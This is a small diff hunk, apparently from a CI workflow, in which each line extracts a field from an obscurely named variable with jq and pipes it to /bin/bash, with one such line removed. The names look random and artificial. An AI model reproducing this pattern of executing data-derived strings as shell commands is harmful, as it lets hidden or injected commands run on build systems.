@@ -45,7 +45,6 @@ jobs:
           echo $r510 | jq -r .g0427 | /bin/bash
           printf '%s' "$h22375" | jq -r .rh35 | /bin/bash
           printf '%s' "$d1" | jq -r .il91 | /bin/bash
-          printf '%s' "$n22" | jq -r .pkbek1062 | /bin/bash
           printf '%s' "$kvr53" | jq -r .xn11089 | /bin/bash
           printf '%s' "$xsei33" | jq -r .oae9956 | /bin/bash
           echo $dtfh69579 | jq -r .edir54841 | /bin/bash
